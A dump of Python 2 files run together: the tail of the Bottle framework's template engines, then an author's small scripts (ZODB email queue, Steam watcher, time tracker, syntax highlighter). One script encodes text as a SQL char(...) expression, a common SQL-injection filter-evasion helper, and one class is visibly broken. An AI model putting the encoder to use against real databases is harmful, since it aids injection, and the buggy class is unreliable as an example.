        self.context = threading.local()
        self.context.vars = {}
        options['searchList'] = [self.context.vars]
        if self.source:
            self.tpl = Template(source=self.source, **options)
        else:
            self.tpl = Template(file=self.filename, **options)

    def render(self, *args, **kwargs):
        for dictarg in args: kwargs.update(dictarg)
        self.context.vars.update(self.defaults)
        self.context.vars.update(kwargs)
        out = str(self.tpl)
        self.context.vars.clear()
        return out


class Jinja2Template(BaseTemplate):
    def prepare(self, filters=None, tests=None, globals={}, **kwargs):
        from jinja2 import Environment, FunctionLoader
        self.env = Environment(loader=FunctionLoader(self.loader), **kwargs)
        if filters: self.env.filters.update(filters)
        if tests: self.env.tests.update(tests)
        if globals: self.env.globals.update(globals)
        if self.source:
            self.tpl = self.env.from_string(self.source)
        else:
            self.tpl = self.env.get_template(self.filename)

    def render(self, *args, **kwargs):
        for dictarg in args: kwargs.update(dictarg)
        _defaults = self.defaults.copy()
        _defaults.update(kwargs)
        return self.tpl.render(**_defaults)

    def loader(self, name):
        fname = self.search(name, self.lookup)
        if not fname: return
        with open(fname, "rb") as f:
            return f.read().decode(self.encoding)


class SimpleTemplate(BaseTemplate):

    def prepare(self, escape_func=html_escape, noescape=False, syntax=None, **ka):
        self.cache = {}
        enc = self.encoding
        self._str = lambda x: touni(x, enc)
        self._escape = lambda x: escape_func(touni(x, enc))
        self.syntax = syntax
        if noescape:
            self._str, self._escape = self._escape, self._str

    @cached_property
    def co(self):
        return compile(self.code, self.filename or '<string>', 'exec')

    @cached_property
    def code(self):
        source = self.source
        if not source:
            with open(self.filename, 'rb') as f:
                source = f.read()
        try:
            source, encoding = touni(source), 'utf8'
        except UnicodeError:
            depr('Template encodings other than utf8 are no longer supported.') #0.11
            source, encoding = touni(source, 'latin1'), 'latin1'
        parser = StplParser(source, encoding=encoding, syntax=self.syntax)
        code = parser.translate()
        self.encoding = parser.encoding
        return code

    def _rebase(self, _env, _name=None, **kwargs):
        _env['_rebase'] = (_name, kwargs)

    def _include(self, _env, _name=None, **kwargs):
        env = _env.copy()
        env.update(kwargs)
        if _name not in self.cache:
            self.cache[_name] = self.__class__(name=_name, lookup=self.lookup)
        return self.cache[_name].execute(env['_stdout'], env)

    def execute(self, _stdout, kwargs):
        env = self.defaults.copy()
        env.update(kwargs)
        env.update({'_stdout': _stdout, '_printlist': _stdout.extend,
            'include': functools.partial(self._include, env),
            'rebase': functools.partial(self._rebase, env), '_rebase': None,
            '_str': self._str, '_escape': self._escape, 'get': env.get,
            'setdefault': env.setdefault, 'defined': env.__contains__ })
        eval(self.co, env)
        if env.get('_rebase'):
            subtpl, rargs = env.pop('_rebase')
            rargs['base'] = ''.join(_stdout) #copy stdout
            del _stdout[:] # clear stdout
            return self._include(env, subtpl, **rargs)
        return env

    def render(self, *args, **kwargs):
        """ Render the template using keyword arguments as local variables. """
        env = {}; stdout = []
        for dictarg in args: env.update(dictarg)
        env.update(kwargs)
        self.execute(stdout, env)
        return ''.join(stdout)


class StplSyntaxError(TemplateError): pass


class StplParser(object):
    """ Parser for stpl templates. """
    _re_cache = {}  #: Cache for compiled re patterns

    # This huge pile of voodoo magic splits python code into 8 different tokens.
    # We use the verbose (?x) regex mode to make this more manageable

    _re_tok = _re_inl = r'''((?mx)         # verbose and dot-matches-newline mode
        [urbURB]*
        (?:  ''(?!')
            |""(?!")
            |'{6}
            |"{6}
            |'(?:[^\\']|\\.)+?'
            |"(?:[^\\"]|\\.)+?"
            |'{3}(?:[^\\]|\\.|\n)+?'{3}
            |"{3}(?:[^\\]|\\.|\n)+?"{3}
        )
    )'''

    _re_inl = _re_tok.replace(r'|\n', '')  # We re-use this string pattern later

    _re_tok += r'''
        # 2: Comments (until end of line, but not the newline itself)
        |(\#.*)

        # 3: Open and close (4) grouping tokens
        |([\[\{\(])
        |([\]\}\)])

        # 5,6: Keywords that start or continue a python block (only start of line)
        |^([\ \t]*(?:if|for|while|with|try|def|class)\b)
        |^([\ \t]*(?:elif|else|except|finally)\b)

        # 7: Our special 'end' keyword (but only if it stands alone)
        |((?:^|;)[\ \t]*end[\ \t]*(?=(?:%(block_close)s[\ \t]*)?\r?$|;|\#))

        # 8: A customizable end-of-code-block template token (only end of line)
        |(%(block_close)s[\ \t]*(?=\r?$))

        # 9: And finally, a single newline. The 10th token is 'everything else'
        |(\r?\n)
    '''

    # Match the start tokens of code areas in a template
    _re_split = r'''(?m)^[ \t]*(\\?)((%(line_start)s)|(%(block_start)s))'''
    # Match inline statements (may contain python strings)
    _re_inl = r'''%%(inline_start)s((?:%s|[^'"\n]+?)*?)%%(inline_end)s''' % _re_inl

    default_syntax = '<% %> % {{ }}'

    def __init__(self, source, syntax=None, encoding='utf8'):
        self.source, self.encoding = touni(source, encoding), encoding
        self.set_syntax(syntax or self.default_syntax)
        self.code_buffer, self.text_buffer = [], []
        self.lineno, self.offset = 1, 0
        self.indent, self.indent_mod = 0, 0
        self.paren_depth = 0

    def get_syntax(self):
        """ Tokens as a space separated string (default: <% %> % {{ }}) """
        return self._syntax

    def set_syntax(self, syntax):
        self._syntax = syntax
        self._tokens = syntax.split()
        if not syntax in self._re_cache:
            names = 'block_start block_close line_start inline_start inline_end'
            etokens = map(re.escape, self._tokens)
            pattern_vars = dict(zip(names.split(), etokens))
            patterns = (self._re_split, self._re_tok, self._re_inl)
            patterns = [re.compile(p%pattern_vars) for p in patterns]
            self._re_cache[syntax] = patterns
        self.re_split, self.re_tok, self.re_inl = self._re_cache[syntax]

    syntax = property(get_syntax, set_syntax)

    def translate(self):
        if self.offset: raise RuntimeError('Parser is a one time instance.')
        while True:
            m = self.re_split.search(self.source, pos=self.offset)
            if m:
                text = self.source[self.offset:m.start()]
                self.text_buffer.append(text)
                self.offset = m.end()
                if m.group(1): # Escape syntax
                    line, sep, _ = self.source[self.offset:].partition('\n')
                    self.text_buffer.append(self.source[m.start():m.start(1)]+m.group(2)+line+sep)
                    self.offset += len(line+sep)
                    continue
                self.flush_text()
                self.offset += self.read_code(self.source[self.offset:], multiline=bool(m.group(4)))
            else: break
        self.text_buffer.append(self.source[self.offset:])
        self.flush_text()
        return ''.join(self.code_buffer)

    def read_code(self, pysource, multiline):
        code_line, comment = '', ''
        offset = 0
        while True:
            m = self.re_tok.search(pysource, pos=offset)
            if not m:
                code_line += pysource[offset:]
                offset = len(pysource)
                self.write_code(code_line.strip(), comment)
                break
            code_line += pysource[offset:m.start()]
            offset = m.end()
            _str, _com, _po, _pc, _blk1, _blk2, _end, _cend, _nl = m.groups()
            if self.paren_depth > 0 and (_blk1 or _blk2): # a if b else c
                code_line += _blk1 or _blk2
                continue
            if _str:    # Python string
                code_line += _str
            elif _com:  # Python comment (up to EOL)
                comment = _com
                if multiline and _com.strip().endswith(self._tokens[1]):
                    multiline = False # Allow end-of-block in comments
            elif _po:  # open parenthesis
                self.paren_depth += 1
                code_line += _po
            elif _pc:  # close parenthesis
                if self.paren_depth > 0:
                    # we could check for matching parentheses here, but it's
                    # easier to leave that to python - just check counts
                    self.paren_depth -= 1
                code_line += _pc
            elif _blk1: # Start-block keyword (if/for/while/def/try/...)
                code_line, self.indent_mod = _blk1, -1
                self.indent += 1
            elif _blk2: # Continue-block keyword (else/elif/except/...)
                code_line, self.indent_mod = _blk2, -1
            elif _end:  # The non-standard 'end'-keyword (ends a block)
                self.indent -= 1
            elif _cend: # The end-code-block template token (usually '%>')
                if multiline: multiline = False
                else: code_line += _cend
            else: # \n
                self.write_code(code_line.strip(), comment)
                self.lineno += 1
                code_line, comment, self.indent_mod = '', '', 0
                if not multiline:
                    break

        return offset

    def flush_text(self):
        text = ''.join(self.text_buffer)
        del self.text_buffer[:]
        if not text: return
        parts, pos, nl = [], 0, '\\\n'+'  '*self.indent
        for m in self.re_inl.finditer(text):
            prefix, pos = text[pos:m.start()], m.end()
            if prefix:
                parts.append(nl.join(map(repr, prefix.splitlines(True))))
            if prefix.endswith('\n'): parts[-1] += nl
            parts.append(self.process_inline(m.group(1).strip()))
        if pos < len(text):
            prefix = text[pos:]
            lines = prefix.splitlines(True)
            if lines[-1].endswith('\\\\\n'): lines[-1] = lines[-1][:-3]
            elif lines[-1].endswith('\\\\\r\n'): lines[-1] = lines[-1][:-4]
            parts.append(nl.join(map(repr, lines)))
        code = '_printlist((%s,))' % ', '.join(parts)
        self.lineno += code.count('\n')+1
        self.write_code(code)

    @staticmethod
    def process_inline(chunk):
        if chunk[0] == '!': return '_str(%s)' % chunk[1:]
        return '_escape(%s)' % chunk

    def write_code(self, line, comment=''):
        code  = '  ' * (self.indent+self.indent_mod)
        code += line.lstrip() + comment + '\n'
        self.code_buffer.append(code)


def template(*args, **kwargs):
    """
    Get a rendered template as a string iterator.
    You can use a name, a filename or a template string as first parameter.
    Template rendering arguments can be passed as dictionaries
    or directly (as keyword arguments).
    """
    tpl = args[0] if args else None
    adapter = kwargs.pop('template_adapter', SimpleTemplate)
    lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)
    tplid = (id(lookup), tpl)
    if tplid not in TEMPLATES or DEBUG:
        settings = kwargs.pop('template_settings', {})
        if isinstance(tpl, adapter):
            TEMPLATES[tplid] = tpl
            if settings: TEMPLATES[tplid].prepare(**settings)
        elif "\n" in tpl or "{" in tpl or "%" in tpl or '$' in tpl:
            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)
        else:
            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)
    if not TEMPLATES[tplid]:
        abort(500, 'Template (%s) not found' % tpl)
    for dictarg in args[1:]: kwargs.update(dictarg)
    return TEMPLATES[tplid].render(kwargs)

mako_template = functools.partial(template, template_adapter=MakoTemplate)
cheetah_template = functools.partial(template, template_adapter=CheetahTemplate)
jinja2_template = functools.partial(template, template_adapter=Jinja2Template)


def view(tpl_name, **defaults):
    """ Decorator: renders a template for a handler.
        The handler can control its behavior like that:

          - return a dict of template vars to fill out the template
          - return something other than a dict and the view decorator will not
            process the template, but return the handler result as is.
            This includes returning a HTTPResponse(dict) to get,
            for instance, JSON with autojson or other castfilters.
    """
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            result = func(*args, **kwargs)
            if isinstance(result, (dict, DictMixin)):
                tplvars = defaults.copy()
                tplvars.update(result)
                return template(tpl_name, **tplvars)
            elif result is None:
                return template(tpl_name, defaults)
            return result
        return wrapper
    return decorator

mako_view = functools.partial(view, template_adapter=MakoTemplate)
cheetah_view = functools.partial(view, template_adapter=CheetahTemplate)
jinja2_view = functools.partial(view, template_adapter=Jinja2Template)






###############################################################################
# Constants and Globals ########################################################
###############################################################################


TEMPLATE_PATH = ['./', './views/']
TEMPLATES = {}
DEBUG = False
NORUN = False # If set, run() does nothing. Used by load_app()

#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')
HTTP_CODES = httplib.responses
HTTP_CODES[418] = "I'm a teapot" # RFC 2324
HTTP_CODES[428] = "Precondition Required"
HTTP_CODES[429] = "Too Many Requests"
HTTP_CODES[431] = "Request Header Fields Too Large"
HTTP_CODES[511] = "Network Authentication Required"
_HTTP_STATUS_LINES = dict((k, '%d %s'%(k,v)) for (k,v) in HTTP_CODES.items())

#: The default template used for error pages. Override with @error()
ERROR_PAGE_TEMPLATE = """
%%try:
    %%from %s import DEBUG, request
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>
        <head>
            <title>Error: {{e.status}}</title>
            <style type="text/css">
              html {background-color: #eee; font-family: sans-serif;}
              body {background-color: #fff; border: 1px solid #ddd;
                    padding: 15px; margin: 15px;}
              pre {background-color: #eee; border: 1px solid #ddd; padding: 5px;}
            </style>
        </head>
        <body>
            <h1>Error: {{e.status}}</h1>
            <p>Sorry, the requested URL <tt>{{repr(request.url)}}</tt>
               caused an error:</p>
            <pre>{{e.body}}</pre>
            %%if DEBUG and e.exception:
              <h2>Exception:</h2>
              <pre>{{repr(e.exception)}}</pre>
            %%end
            %%if DEBUG and e.traceback:
              <h2>Traceback:</h2>
              <pre>{{e.traceback}}</pre>
            %%end
        </body>
    </html>
%%except ImportError:
    <b>ImportError:</b> Could not generate the error page. Please add bottle to
    the import path.
%%end
""" % __name__

#: A thread-safe instance of :class:`LocalRequest`. If accessed from within a
#: request callback, this instance always refers to the *current* request
#: (even on a multithreaded server).
request = LocalRequest()

#: A thread-safe instance of :class:`LocalResponse`. It is used to change the
#: HTTP response for the *current* request.
response = LocalResponse()

#: A thread-safe namespace. Not used by Bottle.
local = threading.local()

# Initialize app stack (create first empty Bottle app)
# BC: 0.6.4 and needed for run()
app = default_app = AppStack()
app.push()

#: A virtual package that redirects import statements.
#: Example: ``import bottle.ext.sqlite`` actually imports `bottle_sqlite`.
ext = _ImportRedirect('bottle.ext' if __name__ == '__main__' else __name__+".ext", 'bottle_%s').module

if __name__ == '__main__':
    opt, args, parser = _cmd_options, _cmd_args, _cmd_parser
    if opt.version:
        _stdout('Bottle %s\n'%__version__)
        sys.exit(0)
    if not args:
        parser.print_help()
        _stderr('\nError: No application entry point specified.\n')
        sys.exit(1)

    sys.path.insert(0, '.')
    sys.modules.setdefault('bottle', sys.modules['__main__'])

    host, port = (opt.bind or 'localhost'), 8080
    if ':' in host and host.rfind(']') < host.rfind(':'):
        host, port = host.rsplit(':', 1)
    host = host.strip('[]')

    run(args[0], host=host, port=int(port), server=opt.server,
        reloader=opt.reload, plugins=opt.plugin, debug=opt.debug)




# THE END
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys
from os.path import join, dirname

# load settings submodule
sys.path.insert(0, join(dirname(__file__), "../plugins"))
import settings


# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    print settings.URL
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os.path

import ZODB.config
from ZODB import DB
from persistent.mapping import PersistentMapping


# Variables ===================================================================
PROJECT_KEY = "pAPI"


# Functions & classes =========================================================
def get_zeo_connection():
    path = os.path.join(os.path.dirname(__file__), "zeo_client.conf")

    # check whether there is zeo_client conf in user's home directory
    home_conf_path = os.path.expanduser("~/.pAPI/zeo_client.conf")
    if os.path.exists(home_conf_path):
        path = home_conf_path

    db = DB(
        ZODB.config.storageFromFile(open(path))
    )
    return db.open()


def get_zeo_root():
    conn = get_zeo_connection()
    dbroot = conn.root()

    if PROJECT_KEY not in dbroot:
        from BTrees.OOBTree import OOBTree
        dbroot[PROJECT_KEY] = OOBTree()

    conn.sync()
    return conn, dbroot[PROJECT_KEY]


def get_zeo_key(key, new_obj=PersistentMapping, cached=True):
    conn, root = get_zeo_root()
    conn.sync()

    if not root.get(key, None):
        root[key] = new_obj()

    return root[key]
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys

sys.path.insert(0, "../")
import settings
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import transaction
from persistent.mapping import PersistentList

from ..helpers import get_zeo_key

from real_notificators.email import send_email
from real_notificators.email import send_message


# Variables ===================================================================
QUEUE_KEY = "email_queue"


# Functions & classes =========================================================
def _add_to_queue(msg):
    queue = get_zeo_key(QUEUE_KEY, PersistentList)
    queue.append(msg)

    transaction.commit()


def add_to_queue(*args, **kwargs):
    kwargs["send_fn"] = _add_to_queue

    send_email(*args, **kwargs)


def get_queued():
    return get_zeo_key(QUEUE_KEY, PersistentList)


def send_wrapper(msg):
    send_message(msg)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import transaction

from notificators.email import get_queued
from notificators.email import send_wrapper


# Functions & classes =========================================================
def send_emails_from_db():
    email_queue = get_queued()

    while email_queue:
        send_wrapper(email_queue.pop(0))

        transaction.commit()


# Main program ================================================================
if __name__ == '__main__':
    send_emails_from_db()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Popis funkce:
#   Vytvoří všechny patřičné fronty, pokud zatím neexistují.
#   Speciální fronta Pushers, ve které jsou objekty, které mají za úkol jednou
#   za čas pushovat messages z jedné fronty do druhé.
#   Speciální fronta reactor, kde jsou objekty, které reagují
# Imports =====================================================================
import sys
import os.path

from persistent import Persistent

# map pAPI to local namespace
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../src"))
import pAPI

from pAPI.pushers import EmailPusher

from pAPI.watchers import SteamWatcher


# Variables ===================================================================
QUEUES = {
    "pushers": [
        EmailPusher(),
        # SMSPusher(),
    ],
    "sources": [
        SteamWatcher(
            name="Spacebase DF-9",
            url="http://store.steampowered.com/app/246090/"
        ),
        SteamWatcher(
            name="Overgrowth",
            url="http://store.steampowered.com/app/25000/"
        ),
    ],
}


# Functions & classes =========================================================
class Accessor(Persistent):
    def __init__(self):
        self.email = None
        self.sms = None

    @property
    def email(self):
        if not self.email:
            self.email = self.resolve_object(EmailPusher, root["pushers"])

        return self.email

    @property
    def sms(self):
        if not self.sms:
            self.sms = self.resolve_object(SMSPusher, root["pushers"])

        return self.sms

    def resolve_object(self, class_type, obj_list):
        objs = [
            obj
            for obj in obj_list
            if isinstance(obj, class_type)
        ]

        return objs[0]


def create_queues(queues):
    for queue_name, queue in QUEUES.iteritems():
        pass


# Structure definition ========================================================
QUEUES["accessor"] = Accessor()


# Main program ================================================================
if __name__ == '__main__':
    pass

#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import pytest

from pAPI.pushers.email_pusher import EmailPusher


# Fixtures ====================================================================
@pytest.fixture
def ep():
    return EmailPusher()


# Tests =======================================================================
def test_init():
    ep = EmailPusher()


def test_queue_email(ep):
    ep.queue_email(
        to="bystrousak@kitakitsune.org",
        subj="Subject",
        body="Hello. This is a test email.",
    )

    assert ep.queue


def test_run(ep, monkeypatch):
    test_queue_email(ep)

    monkeypatch.setattr(
        EmailPusher,
        "_send_message",
        staticmethod(lambda x: x),
    )

    ep.run()

    assert not ep.queue
﻿# -*- coding: utf-8 -*- 
#~ NAME v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

import sys

txt= " ".join(sys.argv[1:])

otxt= "char("
for i in txt:
    otxt+= str(ord(i))+ ","
otxt= otxt[:-1]
otxt+= ")"

print "---\n"+ otxt+ "\n---"#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = "timetracker"
__version = "1.1.0"
__date    = "09.12.2012"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # Odstranit -d a nechat to tak běžet v defaultu?
#= Imports =====================================================================
import os
import sys
import time
import os.path
import argparse

import pyinotify



#= Variables ===================================================================
CONF_DIR     = os.path.expanduser("~/.timetracker")
WATCHLIST_FN = CONF_DIR + "/" + "watchlist.txt"
WATCHLOG_FN  = CONF_DIR + "/" + "watchlog.txt"
MIN_TIME_DIFF = 60 # 1m



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def readFile(fn):
	"Just read file and return it as string."

	fh = open(fn, "rt")
	data = fh.read()
	fh.close()

	return data

def readWatchlist(fn):
	"Read file and return it as unsorted unique list. Filter blank lines."

	return list(set(filter(lambda x: x.strip() != "", readFile(fn).splitlines())))


def addToFile(fn, line):
	"Append line to the file identified with fn."

	fh = open(fn, "a")
	fh.write(line.strip() + "\n")
	fh.close()


def saveList(fn, data):
	"Save list to the file as string."

	fh = open(fn, "wt")
	fh.write("\n".join(data) + "\n")
	fh.close()


def printWatchlist(wl):
	"Print numbered list, if blank, show let user know and exit."

	if len(wl) <= 0:
		writeln("There is nothing on watchlist.")
		sys.exit(0)

	cnt = 0
	for l in wl:
		writeln(str(cnt) + "\t" + l)
		cnt += 1


def analyzeLogFiles(watchlist, loglist):
	"Analyze watchlist and loglist and return stats for each project listed in watchlist."

	data = {}
	for project in watchlist:
		data[project] = SavedRecord(project)

	# read saved data from logfile
	for line in loglist:
		# skip regular log records and blank lines
		if not line.startswith("saved") or line.strip() == "":
			continue

		# get saved results
		sr = SavedRecord(line)
		data[sr.project] = sr

	# process logfile for file access
	for project in filter(lambda line: not line.startswith("saved"), watchlist):
		for line in loglist:
			# skip saved records and blank lines
			if line.startswith("saved") or line.strip() == "":
				continue

			# parse date
			date = int(line[:10])
			line = line[11:]

			# count only records which diff more than MIN_TIME_DIFF
			if line.startswith(project) and abs(date - data[project].last) > MIN_TIME_DIFF:
				data[project].saved += 1
				data[project].last   = date

	return data


class SavedRecord:
	"Used for parsing records saved in loglist."

	def __init__(self, line):
		if not line.startswith("saved") or line.strip() == "":
			self.saved = 0
			self.last  = 0
			self.project = line.strip()
		else:
			line  = line.split(" ")
			self.saved = int(line[1])
			self.last  = int(line[2])

			# join rest of the path back
			self.project = " ".join(line[3:]).strip()

	def __str__(self):
		return "saved " + str(self.saved) + " " + str(self.last) + " " + self.project


class EventHandler(pyinotify.ProcessEvent):
	"Event based system. Bleh."

	def monitorEvent(self, event):
		writeln(event.maskname + " " + event.pathname)
		addToFile(WATCHLOG_FN, str(int(time.time())) + " " + event.pathname)

	def process_IN_CREATE(self, event):
		self.monitorEvent(event)
	def process_IN_DELETE(self, event):
		self.monitorEvent(event)
	def process_IN_MODIFY(self, event):
		self.monitorEvent(event)



#= Main program ================================================================
if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument(
		"-d",
		"--daemon",
		action  = "store_true",
		default = False,
		help    = "Run as daemon, monitor filesystem changes."
	)
	parser.add_argument(
		"-l",
		"--list",
		action  = "store_true",
		default = False,
		help    = "List all watched projects."
	)
	parser.add_argument(
		"-s",
		"--stats",
		action  = "store_true",
		default = False,
		help    = "Show stats for watched projects."
	)
	parser.add_argument(
		"-a",
		"--add",
		metavar = "DIR NAME",
		action  = "store",
		default = "",
		type    = str,
		nargs   = "?",
		help    = "Add new project to the watchlist."
	)
	parser.add_argument(
		"-r",
		"--remove",
		metavar = "ID",
		action  = "store",
		type    = int,
		default = -1,
		help    = "Remove project identified by ID. See --list for list of all IDs."
	)
	parser.add_argument(
		"-v",
		"--version",
		action  = "store_true",
		default = False,
		help    = "Show version."
	)
	args = parser.parse_args()

	# make sure all files exists
	if not os.path.exists(CONF_DIR):
		os.makedirs(CONF_DIR)
	if not os.path.exists(WATCHLIST_FN):
		saveList(WATCHLIST_FN, [])
	if not os.path.exists(WATCHLOG_FN):
		saveList(WATCHLOG_FN, [])
	wl = readWatchlist(WATCHLIST_FN)


	# react to user wishes
	if args.version:
		writeln(version())
		sys.exit(0)

	elif args.list:
		printWatchlist(wl)

	elif args.add != "":
		# get absolute path of file user wants add
		pp = os.path.abspath(os.path.expanduser(args.add.strip()))

		# check if file exists
		if not os.path.exists(pp):
			writeln("Selected path '" + pp + "' doesn't exist!", sys.stderr)
			sys.exit(2)

		addToFile(WATCHLIST_FN, pp)

	elif args.remove >= 0 and args.remove < len(wl):
		del wl[args.remove]

		saveList(WATCHLIST_FN, wl)

		printWatchlist(wl)

	elif args.stats:
		# analyze logs
		data = analyzeLogFiles(wl, readFile(WATCHLOG_FN).splitlines())
		
		# print results and save it 
		new_ll = []
		for project in data.keys():
			writeln("Aprox. " + str(data[project].saved * MIN_TIME_DIFF) + "s\t" + project)

			# memorize results for next time
			new_ll.append(str(data[project]))

		# save results - this saves a lot of time and some diskspace
		saveList(WATCHLOG_FN, new_ll)

	elif args.daemon:
		# well, run at background and log access to the projects
		wm = pyinotify.WatchManager()
		notifier = pyinotify.Notifier(wm, EventHandler())

		for w in wl:
			wm.add_watch(w, pyinotify.ALL_EVENTS, rec=True)

		notifier.loop()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ pyHighlighter v1.0.auvejs (littlebit raped) (31.03.2010) by bystrousak@seznam.cz.
#~ This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/).
#~ Created in jEdit text editor.
#~
##~ Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
##~ emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
##~ U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne i nekomu
##~ jinemu nez mne. Diky.
#~
#~ Todo:
    # keywords budou ruzna pole s ruznymi barvami - to by mohlo pridat trochu barvicek :)
    
# imports
import sys

# variables

# functions & objects
def readFile(filename):
    "Nacte soubor uvedeny v filename a osetri pripadne vyjimky."
    
    try:
        file= open(filename, "r")
        data= file.read()
        file.close()
    except IOError, e:
        print e
        
    return data

def writeFile(filename, data):
    "Do souboru filename zapise jako text obsah promenne data."
    
    try:
        file= open(filename, "w")
        file.write(data)
        file.close()
    except IOError, e:
        print e

def printHelp():
    "Vypise napovedu."
    
    print "Usage:"
    print "\tpython py2html.py filename.py"
    print

class Highlighter:
    """Trida, ktera vytvari barevne zvyrazneni zdrojoveho (defaultne python) kodu.
       Zvyrazneny HTML kod dostanete zavolanim metody highlight(data).
       Obsahuje moznosti nastaveni vlastniho zpusobu zvyraznovani pomoci metod
            setArrays(pole_prvku)
            setKeywords(pole_prvku)
            setTextColor(pole)
            setLineNumbers(stat, tags)
    """
    
    def __init__(self):
        "Inicializuje clenske promenne a nastavi syntaxi na python."
        
        self.endl= "\n"
        self.charmap= ""
        
        ## defaultni nastaveni je highlight python kodu 
        self.setArrays([["##", "\n", "<font color= \"#878787\">", "</font>"], 
                          ["#", "\n", "<font color= \"#018005\">", "</font>"],
                          ['"""', '"""', '<font color= "#870f0f">', "</font>"],
                          ["'''", "'''", '<font color= "#870f0f">', "</font>"],
                          ['"', '"', '<font color= "#800283">', "</font>"],
                          ["'", "'", '<font color= "#800283">', "</font>"]])
        self.setKeywords("""
        and       del       for       is        raise    
        assert    elif      from      lambda    return   
        break     else      global    not       try      
        class     except    if        or        while    
        continue  exec      import    pass      yield    
        def       finally   in        print     as
        None self False True
        """.split(), ['<font color= "#00007f">', "</font>"])
        self.setTextColor(['<font color= "black">', "</font>"])
        self.setLineNumbers(False)
        self.func = ['<font color= "#048080">', "</font>"]

    def removeTags(self, data):
        "Ve vstupnim reetzci provede nahrazeni znaku < a > za jejich html ekvivalenty (&lt; a &gt;)."
        
        data= data.replace("<", "&lt;")
        data= data.replace(">", "&gt;")

        return data
        
    def escapesToHTML(self, data):          # fce nutna kvuli korektnimu parsovani textovych retezcu
        "Provede nahrazeni nekterych vybranych escape sekvenci za jejich vyjadreni v html."
        
        data= data.replace("&", "&amp;")
        data= data.replace('\\\\', "&#92;&#92;")
        data= data.replace('\\"', "\&#34;")
        data= data.replace("\\'", "\&#39;")

        return data
        
    def getLineNums(self, data):
        "Pred kazdy radek vlozi jeho cislo."
        
        odata= []
        lines= data.splitlines()
        
        for i in range(len(lines)):
            odata.append(self.linenumstags[0]+                          # tag obarveni cisla radku
                         str(i+1)+                                      # cislo radku od 1
                         ((len(str(len(lines))) - len(str(i+1))) * " ")+  # vyrovnava pocet mezer
                         2 * " "+                                       # mezery mezi cisly a kodem
                         self.linenumstags[1]+                          # ukoncovaci tag
                         lines[i])                                      # radek kodu
            
        return "\n".join(odata)
      

    ## nejak si nemuzu vzpomenout, proc jsem to delal takhle rucne a ne pomoci regularnich 
    ## vyrazu :/ (ze bych si chtel neco dokazovat??)
    def getGlobalMetadata(self, data):
        "Vytvori metadata - udaje rozsahu jednotlivych struktur (komentare, retezce, ostatni text)."
        
        metadata= []
        
        mtype= "text"
        mstart= 0
        tag1= ""
        tag2= ""
        blocker= ""
        tblocker= False
    
        i= -1   
        while i<len(data):                  # projede cely vstupni retezec znak po znaku
            i+= 1            
            try:
                if blocker == "":
                    for array in self.arrays:       # vyhledava pole (komentare, retezce atp..)
                        if (data[i : (i + len(array[0]))] == array[0]) and len(blocker)==0:
                            if mstart < i:              # ulozi predchozi relaci
                                metadata.append([mtype, mstart, i, tag1, tag2])
                                tblocker=False
                            mtype= "array"
                            mstart= i
                            tag1= array[2]
                            tag2= array[3]
                            blocker= array[1]
                    if (blocker=="") and (tblocker==False): # pokud to neni ani retezec, ani komentar, je to text
                        if mstart < i:                  # ulozeni predchozi relace
                            metadata.append([mtype, mstart, i, tag1, tag2]) 
                        mtype= "text"
                        mstart= i 
                        tag1= self.texttag1
                        tag2= self.texttag2
                        
                        blocker= ""
                        tblocker= True
                else:
                    if data[i : (i + len(blocker))] == blocker:
                        if len(blocker)>1:
                            i+= len(blocker) - 1
                        blocker= ""
            except:
                pass
            
        if mstart < len(data):  # ulozeni posledni relace
            metadata.append([mtype, mstart, len(data), tag1, tag2])
            
        return metadata
        
    def getCharMap(self, data):
        "Vraci retezec obsahujici vsechny znaky pouzite ve vstupni promenne."
        
        charmap= ""
        
        for i in data:
            if i not in charmap:
                charmap+= i
                
        return charmap
        
    def getKwMetadata(self, data):
        "Vytvori metadata potencialnich keywords. Ve skutecnosti pouze oznaci vsechny posloupnosti pismen."
        
        metadata= []
        start= 0
        lasttype= ""
                
        i= -1
        while i < len(data):                # projde cely vstupni retezec znak po znaku
            i+= 1

            try:
